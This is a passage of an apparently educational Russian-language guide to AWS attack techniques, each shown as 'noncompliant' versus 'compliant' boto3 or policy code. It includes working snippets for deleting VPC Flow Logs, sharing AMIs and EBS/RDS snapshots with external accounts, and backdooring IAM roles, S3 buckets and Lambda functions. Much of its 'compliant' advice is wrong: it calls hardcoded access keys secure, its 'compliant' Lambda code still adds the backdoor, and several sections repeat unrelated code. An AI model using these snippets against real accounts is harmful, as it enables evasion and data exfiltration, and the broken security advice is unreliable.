Соответствующий код реализует надлежащие проверки авторизации и валидации перед попыткой покинуть организацию AWS. Он запрашивает подтверждение у пользователя, прежде чем приступить к операции выхода. Если пользователь подтверждает, он пытается покинуть организацию и обрабатывает исключение AccessDeniedException в случае, если запрос отклонен. Код может быть настроен в соответствии с конкретными требованиями, такими как дополнительные проверки валидности или ведение журнала.






## Удаление журналов потоков VPC


Remove VPC Flow Logs - это сценарий симуляции атаки, в котором злоумышленник удаляет конфигурацию VPC Flow Logs из VPC. Это действие может быть использовано в качестве техники уклонения от защиты, чтобы нарушить мониторинг и регистрацию сетевого трафика.

Код, не соответствующий требованиям:

```
import boto3

ec2_client = boto3.client('ec2')

# Укажите идентификатор VPC и идентификатор журнала потоков
vpc_id = 'your-vpc-id'
flow_log_id = 'your-flow-log-id'

# Удалите конфигурацию VPC Flow Logs
response = ec2_client.delete_flow_logs(
    FlowLogIds=[flow_log_id]
)
```

Несоответствующий код использует AWS SDK (boto3) для прямого удаления конфигурации VPC Flow Logs, вызывая метод delete_flow_logs. При этом предполагается, что идентификатор VPC и идентификатор журнала потоков известны и предоставлены в качестве входных данных. Этот код не реализует никаких проверок авторизации или валидации, что позволяет любому человеку с необходимыми учетными данными AWS удалить конфигурацию VPC Flow Logs.

Соответствующий код:

```
import boto3

ec2_client = boto3.client('ec2')

def remove_vpc_flow_logs(vpc_id):
    # Получение идентификаторов журналов потоков, связанных с VPC
    response = ec2_client.describe_flow_logs(
        Filter=[
            {
                'Name': 'resource-id',
                'Values': [vpc_id]
            }
        ]
    )
    
    flow_logs = response['FlowLogs']
    flow_log_ids = [flow_log['FlowLogId'] for flow_log in flow_logs]
    
    if len(flow_log_ids) == 0:
        print(f"No Flow Logs found for VPC {vpc_id}.")
        return
    
    # Удалите конфигурацию VPC Flow Logs
    response = ec2_client.delete_flow_logs(
        FlowLogIds=flow_log_ids
    )
    
    print(f"Flow Logs successfully removed for VPC {vpc_id}.")

# Укажите идентификатор VPC
vpc_id = 'your-vpc-id'

# Удалите конфигурацию VPC Flow Logs
remove_vpc_flow_logs(vpc_id)
```

Соответствующий код реализует функцию remove_vpc_flow_logs, которая извлекает идентификаторы журналов потоков, связанные с указанным VPC, с помощью метода describe_flow_logs. Затем она проверяет, имеются ли журналы потоков для данного VPC. Если журналы потоков найдены, он удаляет конфигурацию журналов потоков VPC, вызывая метод delete_flow_logs с полученными идентификаторами журналов потоков. Код включает соответствующую обработку ошибок и информационные сообщения.



## Выполнение команд обнаружения на экземпляре EC2

Выполнение команд обнаружения на экземпляре EC2 означает запуск различных команд на экземпляре EC2 для сбора информации о среде AWS. Эти команды помогают злоумышленнику получить представление об учетной записи AWS, определить ресурсы и спланировать дальнейшие действия.

Код, не соответствующий требованиям:

```
import boto3

# Создайте клиента EC2
ec2_client = boto3.client('ec2')

# Выполните команды обнаружения
response = ec2_client.describe_snapshots()
print(response)

response = ec2_client.describe_instances()
print(response)

response = ec2_client.describe_vpcs()
print(response)

response = ec2_client.describe_security_groups()
print(response)

# ... (additional discovery commands)
```

Несоответствующий код напрямую использует AWS SDK (boto3) для выполнения различных команд обнаружения на экземпляре EC2. Он предполагает, что необходимые учетные данные AWS доступны на экземпляре EC2, что позволяет любому, кто имеет доступ к экземпляру, выполнить эти команды. Этот код не имеет надлежащей авторизации и может раскрыть конфиденциальную информацию неавторизованным лицам.

Соответствующий код:

```
import boto3

# Создайте клиента EC2 с учетными данными AWS
session = boto3.Session(
    aws_access_key_id='your-access-key',
    aws_secret_access_key='your-secret-key',
    aws_session_token='your-session-token'
)
ec2_client = session.client('ec2')

# Выполните команды обнаружения
response = ec2_client.describe_snapshots()
print(response)

response = ec2_client.describe_instances()
print(response)

response = ec2_client.describe_vpcs()
print(response)

response = ec2_client.describe_security_groups()
print(response)

# ... (additional discovery commands)
```



## Загрузить данные пользователя экземпляра EC2


Под загрузкой пользовательских данных экземпляра EC2 понимается получение пользовательских данных, связанных с экземпляром EC2. Пользовательские данные могут содержать скрипты, конфигурации и другие данные, которые выполняются при запуске экземпляра. В контексте сценария атаки злоумышленник может попытаться загрузить пользовательские данные, чтобы получить сведения о настройках экземпляра, извлечь конфиденциальную информацию или использовать любые неправильные конфигурации.

Код, не соответствующий требованиям:

```
import boto3

# Создайте клиента EC2
ec2_client = boto3.client('ec2')

# Получение идентификаторов экземпляров (вымышленных для демонстрации)
instance_ids = ['i-1234567890abcdef0', 'i-abcdefgh12345678']

# Получите данные о пользователях для каждого экземпляра
for instance_id in instance_ids:
    response = ec2_client.describe_instance_attribute(
        InstanceId=instance_id,
        Attribute='userData'
    )
    user_data = response['UserData']
    print(user_data)
```

Несоответствующий код использует AWS SDK (boto3) для получения данных о пользователях для нескольких экземпляров EC2. Он предполагает, что необходимые учетные данные и разрешения AWS доступны для кода, что позволяет любому, кто имеет доступ к запуску этого кода, получить данные о пользователях. Этот код не имеет надлежащей авторизации и может раскрыть конфиденциальную информацию неавторизованным лицам.

Соответствующий код:


```
import boto3

# Создайте клиента EC2 с учетными данными AWS
session = boto3.Session(
    aws_access_key_id='your-access-key',
    aws_secret_access_key='your-secret-key',
    aws_session_token='your-session-token'
)
ec2_client = session.client('ec2')

# Получение идентификаторов экземпляров (вымышленных для демонстрации)
instance_ids = ['i-1234567890abcdef0', 'i-abcdefgh12345678']

# Получите данные о пользователях для каждого экземпляра
for instance_id in instance_ids:
    response = ec2_client.describe_instance_attribute(
        InstanceId=instance_id,
        Attribute='userData'
    )
    user_data = response['UserData']
    print(user_data)
```

Соответствующий код создает сессию AWS с явными учетными данными AWS. Это гарантирует, что получение пользовательских данных экземпляра EC2 будет осуществляться с использованием указанных учетных данных, а не на основе роли экземпляра. Прямое предоставление учетных данных AWS ограничивает доступ к конфиденциальной информации только уполномоченным лицам и снижает риск несанкционированного извлечения пользовательских данных.





## Запуск необычных экземпляров EC2

Под запуском необычных экземпляров EC2 понимается попытка создания экземпляров EC2 с нетипичными типами экземпляров, например "p2.xlarge". Такая активность может указывать на то, что злоумышленник пытается запустить экземпляры, которые могут обладать специальными возможностями или не используются обычно в среде. Приведенный ниже код, не отвечающий требованиям, демонстрирует попытку запуска необычных экземпляров EC2:

Несоответствующий код:

```
import boto3

# Создайте клиента EC2
ec2_client = boto3.client('ec2')

# Определите тип экземпляра (необычный тип)
instance_type = 'p2.xlarge'

# Попытка запустить экземпляры EC2 с необычным типом
response = ec2_client.run_instances(
    ImageId='ami-12345678',
    MinCount=1,
    MaxCount=1,
    InstanceType=instance_type,
    KeyName='my-key-pair',
    SecurityGroupIds=['sg-12345678'],
    SubnetId='subnet-12345678'
)
```

Несоответствующий код использует AWS SDK (boto3) для попытки запуска экземпляров EC2 с необычным типом экземпляра "p2.xlarge". Однако код не имеет необходимых разрешений для выполнения этого действия, что приводит к ошибке неавторизованной операции.

Соответствующий код:


```
import boto3

# Создайте клиента EC2 с учетными данными AWS
session = boto3.Session(
    aws_access_key_id='your-access-key',
    aws_secret_access_key='your-secret-key',
    aws_session_token='your-session-token'
)
ec2_client = session.client('ec2')

# Определите тип экземпляра (допустимый тип в среде)
instance_type = 't2.micro'

# Попытка запустить экземпляры EC2 с допустимым типом
response = ec2_client.run_instances(
    ImageId='ami-12345678',
    MinCount=1,
    MaxCount=1,
    InstanceType=instance_type,
    KeyName='my-key-pair',
    SecurityGroupIds=['sg-12345678'],
    SubnetId='subnet-12345678'
)
```

Соответствующий код создает сеанс AWS с явным указанием учетных данных AWS и пытается запустить экземпляры EC2 с действительным типом экземпляра ("t2.micro"), который обычно используется в данной среде. Прямое предоставление учетных данных AWS гарантирует, что действие выполняется с использованием указанных учетных данных, а не полагается на роль экземпляра. Этот код следует принципу наименьших привилегий, запуская экземпляры с типичным типом экземпляра и избегая попыток запуска необычных или потенциально вредоносных экземпляров.




## Выполнение команд на экземпляре EC2 через данные пользователя


Выполнение команд на экземпляре EC2 через пользовательские данные - это внедрение и выполнение кода на экземпляре Linux EC2 путем изменения пользовательских данных, связанных с экземпляром. Пользовательские данные - это функция в AWS, позволяющая предоставлять скрипты или инструкции, которые будут выполняться при запуске экземпляра. Злоумышленники могут попытаться использовать эту функцию для выполнения вредоносного кода или повышения привилегий на скомпрометированных экземплярах.


Код, не отвечающий требованиям:
Несоответствующий код демонстрирует, как злоумышленник может изменить пользовательские данные остановленного экземпляра EC2, чтобы внедрить и выполнить вредоносный код.

```
import boto3

# Создайте клиента EC2
ec2_client = boto3.client('ec2')

# Определите идентификатор экземпляра EC2
instance_id = 'i-1234567890abcdef0'

# Остановите экземпляр EC2
ec2_client.stop_instances(InstanceIds=[instance_id])

# Модифицировать пользовательские данные экземпляра EC2 для выполнения вредоносных команд
user_data_script = '#!/bin/bash\n\nmalicious_command\n'
ec2_client.modify_instance_attribute(
    InstanceId=instance_id,
    UserData={
        'Value': user_data_script
    }
)

# Запустите экземпляр EC2
ec2_client.start_instances(InstanceIds=[instance_id])
```

Несоответствующий требованиям код использует AWS SDK (boto3) для остановки экземпляра EC2, изменения его пользовательских данных с помощью вредоносного скрипта, а затем запуска экземпляра. Скрипт пользовательских данных содержит bash-команду "malicious_command", которую злоумышленник намерен выполнить при запуске экземпляра. Однако этот код не соответствует требованиям, поскольку он используется только в демонстрационных целях и не должен выполняться в реальной среде.


Соответствующий код:
Выполнение произвольного кода на экземплярах EC2 через пользовательские данные представляет собой значительный риск для безопасности. Чтобы снизить этот риск, важно обеспечить надлежащий контроль и ограничение пользовательских данных. Приведенный ниже код, соответствующий требованиям, демонстрирует, как обеспечить безопасность пользовательских данных для экземпляров EC2.

```
import boto3
import base64

# Создайте клиента EC2
ec2_client = boto3.client('ec2')

# Определите идентификатор экземпляра EC2
instance_id = 'i-1234567890abcdef0'

# Остановите экземпляр EC2
ec2_client.stop_instances(InstanceIds=[instance_id])

# Определите необходимые команды или сценарии для выполнения
user_data_commands = [
    '#!/bin/bash',
    'echo "Executing secure user data commands"',
    'echo "Command 1"',
    'echo "Command 2"',
]

# Закодируйте команды пользовательских данных в base64
user_data_encoded = base64.b64encode('\n'.join(user_data_commands).encode()).decode()

# Изменить пользовательские данные экземпляра EC2 на безопасные пользовательские данные
ec2_client.modify_instance_attribute(
    InstanceId=instance_id,
    UserData={
        'Value': user_data_encoded
    }
)

# Запустите экземпляр EC2
ec2_client.start_instances(InstanceIds=[instance_id])
```

Соответствующий код соответствует лучшим практикам обеспечения безопасности пользовательских данных для экземпляров EC2. Вместо того чтобы внедрять произвольный код, он определяет набор необходимых команд или скриптов для выполнения. Эти команды хранятся в списке, а затем кодируются в формате base64, чтобы обеспечить правильное кодирование и предотвратить любые попытки инъекций. Команды пользовательских данных могут быть настроены в соответствии с желаемой конфигурацией или настройками, необходимыми для экземпляра EC2.






## Открытие входящего порта 22 в группе безопасности

Открытие входящего порта 22 в группе безопасности означает разрешение входящего трафика по порту 22 (SSH) из Интернета (0.0.0.0/0) на определенную группу безопасности в AWS. Такая конфигурация может представлять угрозу безопасности, если ее не контролировать или не ограничивать должным образом.



Несоответствующий код:
Несоответствующий код демонстрирует, как злоумышленник может использовать AWS SDK для открытия входящего трафика на порт 22 из Интернета.



```
import boto3

# Создайте клиента EC2
ec2_client = boto3.client('ec2')

# Определите идентификатор группы безопасности
security_group_id = 'sg-1234567890abcdef0'

# Разрешить входящий трафик на порт 22 с 0.0.0.0/0
ec2_client.authorize_security_group_ingress(
    GroupId=security_group_id,
    IpPermissions=[
        {
            'IpProtocol': 'tcp',
            'FromPort': 22,
            'ToPort': 22,
            'IpRanges': [{'CidrIp': '0.0.0.0/0'}]
        }
    ]
)
```

Несоответствующий код использует AWS SDK (boto3) для авторизации входящего трафика на порту 22 из Интернета (0.0.0.0/0) для определенной группы безопасности. Этот код не соответствует требованиям, поскольку открывает порт 22 для всех IP-адресов, что может представлять значительный риск для безопасности, если в этом нет необходимости.

Соответствующий код:
Открывать порт 22 для всех IP-адресов из Интернета обычно не рекомендуется из-за последствий для безопасности. Приведенный ниже код, соответствующий требованиям, демонстрирует, как ограничить входной доступ только определенными доверенными IP-адресами.


```
import boto3

# Создайте клиента EC2
ec2_client = boto3.client('ec2')

# Определите идентификатор группы безопасности
security_group_id = 'sg-1234567890abcdef0'

# Разрешить входящий трафик на порт 22 с доверенных IP-адресов
ec2_client.authorize_security_group_ingress(
    GroupId=security_group_id,
    IpPermissions=[
        {
            'IpProtocol': 'tcp',
            'FromPort': 22,
            'ToPort': 22,
            'IpRanges': [{'CidrIp': 'trusted_ip_address/32'}]
        }
    ]
)
```

Соответствующий код ограничивает входной доступ на порт 22 определенным доверенным IP-адресом, заменяя 'trusted_ip_address' на фактический IP-адрес или диапазон, разрешенный для подключения по SSH. Это гарантирует, что только авторизованные источники могут устанавливать SSH-соединения с экземплярами, связанными с группой безопасности.




## Эксфильтрация AMI путем предоставления общего доступа

Чтобы получить доступ к AMI, нужно передать образ машины Amazon Machine Image (AMI) внешнему аккаунту AWS и позволить получателю запускать экземпляры из общего AMI. Эта техника может быть использована для перемещения AMI в неавторизованную учетную запись для дальнейшего анализа или использования не по назначению.

Код, не отвечающий требованиям:
Несоответствующий код демонстрирует, как злоумышленник может использовать AWS SDK для предоставления общего доступа к AMI внешней учетной записи AWS.

```
import boto3

# Создайте клиента EC2
ec2_client = boto3.client('ec2')

# Определите идентификатор AMI
ami_id = 'ami-01234567890abcdef'

# Определите идентификатор учетной записи AWS для совместного использования
account_id = '012345678901'

# Предоставьте доступ к AMI внешней учетной записи AWS
ec2_client.modify_image_attribute(
    ImageId=ami_id,
    LaunchPermission={
        'Add': [{'UserId': account_id}]
    }
)
```

Код, не соответствующий требованиям, использует AWS SDK (boto3) для изменения разрешений на запуск AMI и предоставления доступа к нему внешней учетной записи AWS, указанной в account_id. Этот код не соответствует требованиям, поскольку позволяет получить несанкционированный доступ к AMI, что потенциально может позволить злоумышленнику запускать экземпляры из общего образа.

Соответствующий код:
Соответствующий код демонстрирует, как правильно защитить AMI и предотвратить несанкционированный обмен.

```
import boto3

# Создайте клиента EC2
ec2_client = boto3.client('ec2')

# Определите идентификатор AMI
ami_id = 'ami-01234567890abcdef'

# Отмена разрешений на публичный запуск AMI
ec2_client.reset_image_attribute(
    ImageId=ami_id,
    Attribute='launchPermission'
)
```

Соответствующий код отменяет все разрешения на публичный запуск AMI, указанного в ami_id, путем сброса атрибута image. Это гарантирует, что AMI не будет доступен ни одной учетной записи AWS, кроме той, которой он принадлежит. Ограничение доступа к AMI только для доверенных и авторизованных учетных записей снижает риск несанкционированного доступа и утечки данных.




## Эксфильтрация моментального снимка EBS путем предоставления общего доступа к нему

Эксфильтрация моментального снимка EBS путем предоставления к нему общего доступа подразумевает предоставление внешнего снимка Amazon Elastic Block Store (EBS) внешней учетной записи AWS, что позволяет учетной записи-получателю создать новый том из общего снимка. Эта техника может быть использована для перемещения конфиденциальных данных, хранящихся в моментальных снимках EBS, в неавторизованную учетную запись для дальнейшего анализа или использования не по назначению.

Код, не отвечающий требованиям:
Код, не соответствующий требованиям, демонстрирует, как злоумышленник может использовать AWS SDK для предоставления общего доступа к снимку EBS внешней учетной записи AWS.

```
import boto3

# Создайте клиента EC2
ec2_client = boto3.client('ec2')

# Определите идентификатор моментального снимка
snapshot_id = 'snap-01234567890abcdef'

# Определите идентификатор учетной записи AWS для совместного использования
account_id = '012345678901'

# Поделитесь моментальным снимком с внешней учетной записью AWS
ec2_client.modify_snapshot_attribute(
    SnapshotId=snapshot_id,
    Attribute='createVolumePermission',
    CreateVolumePermission={
        'Add': [{'UserId': account_id}]
    }
)
```

Код, не соответствующий требованиям, использует AWS SDK (boto3) для изменения разрешений на создание тома для моментального снимка EBS и предоставления доступа к нему внешней учетной записи AWS, указанной в account_id. Этот код не соответствует требованиям, поскольку позволяет получить несанкционированный доступ к моментальному снимку, что потенциально может позволить злоумышленнику создать новые тома и получить доступ к данным, хранящимся в общем снимке.

Соответствующий код:
Соответствующий код демонстрирует, как правильно защитить снимки EBS и предотвратить несанкционированный доступ к ним.



```
import boto3

# Создайте клиента EC2
ec2_client = boto3.client('ec2')

# Определите идентификатор моментального снимка
snapshot_id = 'snap-01234567890abcdef'

# Отмена разрешений на общий доступ к снимку
ec2_client.reset_snapshot_attribute(
    SnapshotId=snapshot_id,
    Attribute='createVolumePermission'
)
```

Соответствующий код отменяет все разрешения на публичный доступ к снимку EBS, указанному в snapshot_id, путем сброса атрибута снимка. Это гарантирует, что снимок не будет доступен ни одной учетной записи AWS, кроме той, которой он принадлежит. Ограничение доступа к снимкам EBS только для доверенных и авторизованных учетных записей снижает риск несанкционированного доступа и утечки данных.




## Эксфильтрация моментального снимка RDS с помощью общего доступа


Эксфильтрация моментального снимка RDS путем предоставления общего доступа заключается в передаче моментального снимка базы данных Amazon RDS внешней учетной записи AWS. Эта техника позволяет учетной записи-получателю восстановить снимок и получить доступ к содержащимся в нем данным базы данных.

Код, не отвечающий требованиям:
Несоответствующий требованиям код демонстрирует, как злоумышленник может использовать AWS SDK для предоставления снимка RDS внешнему аккаунту AWS.

```
import boto3

# Создайте клиента RDS
rds_client = boto3.client('rds')

# Определите идентификатор моментального снимка
snapshot_identifier = 'my-db-snapshot'

# Определите идентификатор учетной записи AWS для совместного использования
account_id = '012345678901'

# Предоставьте общий доступ к снимку RDS внешней учетной записи AWS
rds_client.modify_db_snapshot_attribute(
    DBSnapshotIdentifier=snapshot_identifier,
    AttributeName='restore',
    ValuesToAdd=[account_id]
)
```

Код, не соответствующий требованиям, использует AWS SDK (boto3) для изменения атрибутов снимка RDS и предоставления доступа к нему внешней учетной записи AWS, указанной в account_id. Этот код не соответствует требованиям, поскольку позволяет получить несанкционированный доступ к снимку, что потенциально может позволить злоумышленнику восстановить снимок в своей учетной записи и получить доступ к данным базы данных.

Соответствующий код:
Соответствующий код демонстрирует, как правильно защитить снимки RDS и предотвратить несанкционированный доступ к ним.

```
import boto3

# Создайте клиента RDS
rds_client = boto3.client('rds')

# Определите идентификатор моментального снимка
snapshot_identifier = 'my-db-snapshot'

# Отмена разрешений на общий доступ к снимку RDS
rds_client.modify_db_snapshot_attribute(
    DBSnapshotIdentifier=snapshot_identifier,
    AttributeName='restore',
    ValuesToRemove=['all']
)
```

Соответствующий код отменяет все разрешения на совместный доступ к снимку RDS, указанному в идентификаторе snapshot_identifier, удаляя все значения, связанные с атрибутом 'restore'. Это гарантирует, что моментальный снимок не будет доступен ни одной учетной записи AWS, кроме той, которая им владеет. Ограничение доступа к снимкам RDS только доверенными и авторизованными учетными записями снижает риск несанкционированного доступа и утечки данных.




## Бэкдор ведра S3 через политику ведра

Бэкдоринг ведра S3 через политику ведра заключается в изменении политики, чтобы разрешить несанкционированный доступ к ведру, что позволяет злоумышленнику вывести данные из ведра.

Код, не отвечающий требованиям:
Несоответствующий код демонстрирует, как злоумышленник может изменить политику Bucket Policy, чтобы предоставить доступ к внешней учетной записи AWS.

```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::012345678901:root"
      },
      "Action": [
        "s3:GetObject",
        "s3:GetBucketLocation",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::my-bucket/*",
        "arn:aws:s3:::my-bucket"
      ]
    }
  ]
}
```

Несоответствующий код изменяет политику ведра, чтобы предоставить доступ внешней учетной записи AWS, указанной в AWS ARN arn:aws:iam::012345678901:root. Указанной учетной записи предоставляются разрешения на выполнение таких действий, как GetObject, GetBucketLocation и ListBucket над ведром, идентифицированным как my-bucket. Этот код не соответствует требованиям, поскольку позволяет получить несанкционированный доступ к ведру S3, что может привести к утечке конфиденциальных данных.

Соответствующий код:
Соответствующий код демонстрирует, как правильно защитить ведро S3, удалив несанкционированный доступ из политики ведра.

```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Deny",
      "Principal": "*",
      "Action": [
        "s3:GetObject",
        "s3:GetBucketLocation",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::my-bucket/*",
        "arn:aws:s3:::my-bucket"
      ]
    }
  ]
}
```

Соответствующий код изменяет политику ведра, чтобы запретить доступ любому принципалу (подстановочный знак `*`), пытающемуся выполнить такие действия, как GetObject, GetBucketLocation и ListBucket над ведром, идентифицированным my-bucket. Запрещая любой доступ, кроме явно авторизованных принципалов, ведро защищено от несанкционированного доступа и утечки данных.



## Вход в консоль без MFA

Вход в консоль без MFA относится к сценарию, когда IAM-пользователь может войти в консоль управления AWS без использования многофакторной аутентификации (MFA), которая является дополнительной мерой безопасности для защиты учетных записей пользователей.


Несоответствующий код:
Несоответствующий код демонстрирует вход пользователя IAM в AWS Management Console без использования MFA. Этот код не применяет MFA для пользователя.

В сценарии, не соответствующем требованиям, пользователь IAM может войти в консоль управления AWS, используя свое имя пользователя и пароль, не предоставляя дополнительный токен MFA. Это обходит требование MFA, потенциально подвергая учетную запись несанкционированному доступу, если учетные данные пользователя IAM будут скомпрометированы.

Соответствующий код:
Соответствующий код демонстрирует правильную конфигурацию для обеспечения MFA при входе в консоль для пользователя IAM.

Чтобы соответствовать лучшим практикам безопасности, для пользователей IAM при входе в консоль следует применять MFA. Для этого пользователю необходимо предоставить дополнительный фактор, например одноразовый пароль, сгенерированный устройством или приложением MFA, в дополнение к имени пользователя и паролю.


## Бэкдор в IAM-роли

Под бэкдорингом роли IAM понимается изменение политики доверия существующей роли IAM с целью предоставления несанкционированного доступа к роли из внешней учетной записи AWS. Это позволяет злоумышленнику принять на себя роль с бэкдором и потенциально получить повышенные привилегии или выполнить вредоносные действия.



Код, не отвечающий требованиям:
Несоответствующий код демонстрирует модифицированную политику доверия для роли IAM, которая открывает доступ к роли, предоставляя доступ к внешней учетной записи AWS.

```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "ec2.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    },
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::193672423079:root"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
```


В сценарии, не соответствующем требованиям, политика доверия роли IAM изменена, чтобы позволить двум сущностям принимать роль. Принципалу "Service" со значением "ec2.amazonaws.com" разрешено принимать роль, что является типичной конфигурацией для экземпляров EC2 в рамках одной учетной записи AWS. Однако политика также включает в себя "AWS" принципала со значением "arn:aws:iam::193672423079:root", который представляет собой внешнюю учетную запись AWS. Это предоставляет несанкционированный доступ к роли IAM из указанной внешней учетной записи.

Соответствующий код:
Соответствующий код демонстрирует правильно настроенную политику доверия для роли IAM, которая не содержит никаких несанкционированных разрешений на доступ.

Для обеспечения безопасности ролей IAM очень важно определить соответствующую политику доверия, которая строго ограничивает круг лиц, которые могут принимать роль. Политика доверия должна включать только доверенные организации и службы AWS, которым требуется доступ к роли.


## Создание ключа доступа для пользователя IAM

Создание ключа доступа для пользователя IAM означает генерацию ключей доступа, которые предоставляют программный доступ к службам и ресурсам AWS для указанного пользователя. Эти ключи доступа состоят из идентификатора ключа доступа и секретного ключа доступа, которые используются для целей аутентификации.

Несоответствующий код:
Код, не соответствующий требованиям, демонстрирует создание ключа доступа для пользователя IAM без надлежащего контроля и мониторинга.

```
import boto3

def create_access_key(user_name):
    iam = boto3.client('iam')
    response = iam.create_access_key(UserName=user_name)
    access_key_id = response['AccessKey']['AccessKeyId']
    secret_access_key = response['AccessKey']['SecretAccessKey']
    print(f"Access Key ID: {access_key_id}")
    print(f"Secret Access Key: {secret_access_key}")

# Использование
create_access_key('my_user')
```

В коде, не соответствующем требованиям, ключ доступа создается для пользователя IAM без учета лучших практик безопасности. Ключ доступа создается с помощью метода create_access_key из AWS SDK. Идентификатор ключа доступа и секретный ключ доступа выводятся в консоль, что может привести к случайному раскрытию или потенциальному неправомерному использованию.

Соответствующий код:
Соответствующий код демонстрирует создание ключа доступа для пользователя IAM с надлежащим контролем и мониторингом.



```
import boto3

def create_access_key(user_name):
    iam = boto3.client('iam')
    response = iam.create_access_key(UserName=user_name)
    access_key_id = response['AccessKey']['AccessKeyId']
    secret_access_key = response['AccessKey']['SecretAccessKey']
    # надежно хранить ключ доступа или предоставлять его пользователю с помощью защищенных средств
    print(f"Access key created for IAM user: {user_name}")

# Использование
create_access_key('my_user')
```

В совместимом коде ключ доступа по-прежнему создается для пользователя IAM, но при этом принимаются дополнительные меры безопасности:

* Идентификатор ключа доступа и секретный ключ доступа не распечатываются и не раскрываются напрямую. Вместо этого они должны надежно храниться или предоставляться пользователю с помощью безопасных средств.

* Доступ к коду, создающему ключ доступа, должен быть ограничен уполномоченными лицами или системами.

* Внедрите надлежащие средства контроля доступа и принципы наименьших привилегий, чтобы гарантировать, что пользователи имеют только необходимые разрешения на создание ключей доступа.

* Контролируйте и проверяйте создание ключей доступа с помощью AWS CloudTrail. Предупреждайте о любых необычных или несанкционированных действиях по созданию ключей доступа.


## Создание административного пользователя IAM

Создание ключа доступа для пользователя IAM означает генерацию ключей доступа, которые предоставляют программный доступ к службам и ресурсам AWS для указанного пользователя. Эти ключи доступа состоят из идентификатора ключа доступа и секретного ключа доступа, которые используются для целей аутентификации.


Несоответствующий код:
Код, не соответствующий требованиям, демонстрирует создание ключа доступа для пользователя IAM без учета лучших практик безопасности.

```
import boto3

def create_access_key(user_name):
    iam = boto3.client('iam')
    response = iam.create_access_key(UserName=user_name)
    access_key_id = response['AccessKey']['AccessKeyId']
    secret_access_key = response['AccessKey']['SecretAccessKey']
    print(f"Access Key ID: {access_key_id}")
    print(f"Secret Access Key: {secret_access_key}")

# Использование
create_access_key('my_user')
```

В коде, не соответствующем требованиям, ключ доступа создается для пользователя IAM без учета лучших практик безопасности. Ключ доступа создается с помощью метода create_access_key из AWS SDK. Идентификатор ключа доступа и секретный ключ доступа выводятся в консоль, что может привести к случайному раскрытию или потенциальному неправомерному использованию.

Соответствующий код:
Соответствующий код демонстрирует создание ключа доступа для пользователя IAM с использованием надлежащих средств контроля и мер безопасности.

```
import boto3

def create_access_key(user_name):
    iam = boto3.client('iam')
    response = iam.create_access_key(UserName=user_name)
    access_key_id = response['AccessKey']['AccessKeyId']
    secret_access_key = response['AccessKey']['SecretAccessKey']
    # надежно хранить ключ доступа или предоставлять его пользователю с помощью защищенных средств
    print(f"Access key created for IAM user: {user_name}")

# Использование
create_access_key('my_user')
```


## Создание профиля входа для пользователя IAM

Создание ключа доступа для пользователя IAM обеспечивает программный доступ к сервисам и ресурсам AWS для данного пользователя. Ключи доступа состоят из идентификатора ключа доступа и секретного ключа доступа, которые используются для аутентификации при выполнении API-запросов к AWS.


Несоответствующий код:
Следующий код, не соответствующий требованиям, демонстрирует создание ключа доступа для пользователя IAM без учета лучших практик безопасности:

```
import boto3

def create_access_key(user_name):
    iam = boto3.client('iam')
    response = iam.create_access_key(UserName=user_name)
    access_key_id = response['AccessKey']['AccessKeyId']
    secret_access_key = response['AccessKey']['SecretAccessKey']
    print(f"Access Key ID: {access_key_id}")
    print(f"Secret Access Key: {secret_access_key}")

# Использование
create_access_key('my_user')
```

Несоответствующий код использует метод create_access_key AWS SDK для генерации ключа доступа для указанного пользователя IAM. Он извлекает из ответа идентификатор ключа доступа и секретный ключ доступа и выводит их на консоль. Хранение или раскрытие ключа доступа таким образом повышает риск случайного раскрытия или несанкционированного доступа.

Соответствующий код:
Следующий код, соответствующий требованиям, демонстрирует создание ключа доступа для пользователя IAM с соблюдением лучших практик безопасности:

```
import boto3
import getpass

def create_access_key(user_name):
    iam = boto3.client('iam')
    response = iam.create_access_key(UserName=user_name)
    access_key_id = response['AccessKey']['AccessKeyId']
    # Храните или предоставляйте ключ доступа в безопасном месте, не показывая его.
    print("Access key created for IAM user:", user_name)

# Использование
user_name = getpass.getuser()
create_access_key(user_name)
```

## Бэкдор функции Lambda через политику на основе ресурсов

Бэкдор функции Lambda через политику на основе ресурсов заключается в изменении разрешений функции Lambda, чтобы разрешить ее вызов из внешней учетной записи AWS. Это обеспечивает постоянство, позволяя несанкционированный доступ к функции.

Несоответствующий код:
Следующий код, не соответствующий требованиям, демонстрирует бэкдорсинг функции Lambda путем изменения ее политики на основе ресурсов без учета лучших практик безопасности:

```
import boto3

def backdoor_lambda_function(function_name, external_account_id):
    lambda_client = boto3.client('lambda')
    response = lambda_client.add_permission(
        FunctionName=function_name,
        StatementId='backdoor',
        Action='lambda:InvokeFunction',
        Principal='arn:aws:iam::' + external_account_id + ':root'
    )
    print("Lambda function backdoored successfully.")

# Использование
backdoor_lambda_function('my-function', '123456789012')
```

Код, не соответствующий требованиям, использует метод add_permission в AWS SDK для изменения ресурсной политики функции Lambda. Он добавляет оператор разрешения, который позволяет указанной внешней учетной записи AWS вызывать функцию. Этот код не учитывает лучшие практики безопасности, такие как правильная авторизация и проверка.

Соответствующий код:
Следующий код, отвечающий требованиям, демонстрирует бэкдоринг функции Lambda с соблюдением лучших практик безопасности:

```
import boto3

def backdoor_lambda_function(function_name, external_account_id):
    lambda_client = boto3.client('lambda')
    response = lambda_client.add_permission(
        FunctionName=function_name,
        StatementId='backdoor',
        Action='lambda:InvokeFunction',
        Principal='arn:aws:iam::' + external_account_id + ':root'
    )
    if response['ResponseMetadata']['HTTPStatusCode'] == 201:
        print("Lambda function backdoored successfully.")
    else:
        print("Failed to backdoor Lambda function.")

# Использование
backdoor_lambda_function('my-function', '123456789012')
```


## Перезапись кода лямбда-функции

Перезапись кода функции Lambda подразумевает изменение кода существующей функции Lambda для создания постоянства или выполнения более сложных операций, таких как утечка данных во время выполнения.


Код, не отвечающий требованиям:
Следующий код, не отвечающий требованиям, демонстрирует перезапись кода функции Lambda без учета лучших практик безопасности:

```
import boto3

def overwrite_lambda_code(function_name, new_code_path):
    lambda_client = boto3.client('lambda')
    with open(new_code_path, 'rb') as file:
        new_code = file.read()
